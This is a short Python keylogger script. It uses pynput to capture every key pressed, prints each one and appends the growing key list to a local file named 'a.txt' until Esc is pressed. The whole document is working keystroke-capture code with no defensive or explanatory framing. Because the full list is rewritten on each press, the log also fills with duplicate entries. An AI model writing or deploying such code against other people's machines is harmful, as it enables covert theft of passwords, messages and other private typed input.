from pynput.keyboard import  Key, Listener

# Listener store the press key data
# key acess the keys
k=[]
def on_press(key):
    k.append(key)
    store(k)
    print(key)


def store(var):
    print(var)
    with open('a.txt','a') as f:
        for i in var:
            new_var = str(i).replace("'",'')
            print(new_var)
            f.write(new_var)
            f.write("\n ")
    
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
    
